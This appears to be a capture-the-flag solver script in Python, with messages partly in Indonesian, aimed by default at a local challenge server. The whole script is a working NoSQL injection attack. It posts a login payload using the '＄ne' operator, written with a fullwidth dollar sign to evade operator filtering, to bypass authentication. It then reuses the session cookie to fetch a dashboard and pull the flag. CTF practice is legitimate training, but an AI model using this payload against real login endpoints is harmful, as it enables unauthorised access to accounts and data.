#!/usr/bin/env python3
import argparse
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request


def extract_flag(text: str):
    match = re.search(r"Cyberkits\{[^\n\r\t\v\f ]+\}", text)
    if match:
        return match.group(0)
    return None


def post_json(url: str, data: dict):
    body = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json", "User-Agent": "ctf-solver/1.0"},
        method="POST",
    )
    return urllib.request.urlopen(req, timeout=10)


def get_page(url: str, cookies: str = ""):
    headers = {"User-Agent": "ctf-solver/1.0"}
    if cookies:
        headers["Cookie"] = cookies
    req = urllib.request.Request(url, headers=headers, method="GET")
    return urllib.request.urlopen(req, timeout=10)


def main():
    parser = argparse.ArgumentParser(description="Solver NoSQLi unicode operator bypass")
    parser.add_argument("--base", default="http://localhost:8080", help="Base URL challenge")
    args = parser.parse_args()

    base = args.base.rstrip("/")
    login_url = f"{base}/api/login"
    dash_url = f"{base}/dashboard"

    payload = {
        "username": {"＄ne": None},
        "password": {"＄ne": None},
    }

    print("[+] Sending payload bypass...")
    try:
        with post_json(login_url, payload) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            set_cookie = resp.headers.get("Set-Cookie", "")
            print(f"[+] Login status: {resp.status}")
            print(f"[+] Login response: {raw}")

            if not set_cookie:
                print("[-] Tidak dapat cookie sesi. Eksploit gagal.")
                return 1

            session_cookie = set_cookie.split(";", 1)[0]

        print("[+] Fetching dashboard...")
        with get_page(dash_url, session_cookie) as dash_resp:
            html = dash_resp.read().decode("utf-8", errors="replace")
            flag = extract_flag(html)
            print(f"[+] Dashboard status: {dash_resp.status}")

            if flag:
                print(f"[FLAG] {flag}")
                return 0

            print("[-] Flag tidak ditemukan di dashboard.")
            return 2

    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        print(f"[-] HTTP error: {exc.code}")
        print(body)
        return 3
    except Exception as exc:
        print(f"[-] Error: {exc}")
        return 4


if __name__ == "__main__":
    sys.exit(main())
